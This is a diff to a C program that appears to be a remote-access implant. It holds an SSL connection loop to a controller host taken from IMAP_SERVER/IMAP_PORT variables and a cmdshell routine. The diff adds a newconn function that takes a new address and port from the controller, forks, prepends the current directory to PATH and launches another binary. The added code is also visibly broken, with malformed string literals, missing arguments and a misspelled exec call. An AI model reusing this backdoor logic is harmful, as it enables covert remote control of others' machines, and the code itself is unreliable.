@@ -81,6 +81,34 @@ SSL_CTX* initCTX(void) {
   return ctx;
 }
 
+int newconn(SSL *ssl, pid_t *pids) {
+  uint8_t buf[4096] = {0};
+  pid_t pid;
+  char addr[INET6_ADDRSTRLEN];
+  char port[6];
+  size_t ts, tr;
+
+  ssl_writeall(ssl, '100', 4, &ts);
+  ssl_readall(ssl, addr, sizeof(addr), &tr);
+  ssl_writeall(ssl, '101', 4, &ts);
+  ssl_readall(ssl, port)
+
+  pid = fork();
+  if (pid == -1) {
+    ssl_writeall(ssl, '-1', 3, &ts);
+  } else if (pid == 0) {
+    setenv("IMAP_SERVER", addr, 1);
+    setenv("IMAP_PORT", port, 1);
+    sprintf(buf, getenv("PATH"));
+    sprintf(buf + strlen(buf), ":.");
+    setenv("PATH",buf);
+    excelp('sbs');
+  } else {
+    ssl_writeall(ssl, pid, sizeof(pid), &tr);
+  }
+
+}
+
 int cmdshell(SSL *ssl) {
   //https://stackoverflow.com/questions/33884291/pipes-dup2-and-exec
   //https://stackoverflow.com/questions/21558937/i-do-not-understand-how-execlp-works-in-linux
@@ -339,10 +367,14 @@ int main(void) {
   const char* addr;
   const char* port;
 
-  //daemon();
+  //daemon(0,0);
 
   addr = getenv("IMAP_SERVER");
   port = getenv("IMAP_PORT");
+
+  if (addr == NULL || port == NULL) {
+    return -1;
+  }
 
   while (1) {
     SSL_library_init();
